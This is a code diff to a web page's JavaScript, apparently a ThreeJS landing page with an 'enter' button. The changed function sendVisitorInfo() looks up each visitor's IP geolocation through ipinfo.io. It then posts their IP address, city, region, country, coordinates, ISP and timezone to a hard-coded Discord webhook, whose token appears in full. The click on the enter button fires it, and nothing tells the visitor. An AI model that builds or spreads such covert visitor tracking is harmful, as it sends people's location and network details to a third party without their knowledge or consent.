@@ -42,17 +42,36 @@
         // Function to gather visitor info and send to webhook
         async function sendVisitorInfo() {
             const webhookUrl = "https://discord.com/api/webhooks/1325077534743990284/J-NTUdd4F6Rw-oQBTmfHaPuxOnhvLiBcet-wlMGJnAn1w09B4T8SiFtp9kuESQl-tdKy";
-            const locationData = await fetch("https://ipinfo.io/json").then(res => res.json());
-            
-            const message = {
-                content: `New visitor detected:\nIP: ${locationData.ip}\nLocation: ${locationData.city}, ${locationData.region}, ${locationData.country}\nCoordinates: ${locationData.loc}\nISP: ${locationData.org}\nTimezone: ${locationData.timezone}`,
-            };
 
-            await fetch(webhookUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(message),
-            });
+            try {
+                // Fetch location data
+                const locationResponse = await fetch("https://ipinfo.io/json");
+                if (!locationResponse.ok) {
+                    console.error("Failed to fetch location data");
+                    return;
+                }
+                const locationData = await locationResponse.json();
+
+                // Prepare message for the webhook
+                const message = {
+                    content: `New visitor detected:\nIP: ${locationData.ip}\nLocation: ${locationData.city}, ${locationData.region}, ${locationData.country}\nCoordinates: ${locationData.loc}\nISP: ${locationData.org}\nTimezone: ${locationData.timezone}`,
+                };
+
+                // Send message to the webhook
+                const response = await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(message),
+                });
+
+                if (!response.ok) {
+                    console.error("Failed to send webhook:", response.status, await response.text());
+                } else {
+                    console.log("Webhook sent successfully!");
+                }
+            } catch (error) {
+                console.error("Error sending webhook:", error);
+            }
         }
 
         // Set up ThreeJS scene
@@ -76,7 +95,7 @@
             renderer.render(scene, camera);
         }
 
-        // Trigger animation after blur overlay is removed
+        // Trigger animation and send webhook on button click
         document.getElementById("enter-button").addEventListener("click", () => {
             document.getElementById("blur-overlay").style.display = "none";
             sendVisitorInfo(); // Send visitor info after the click
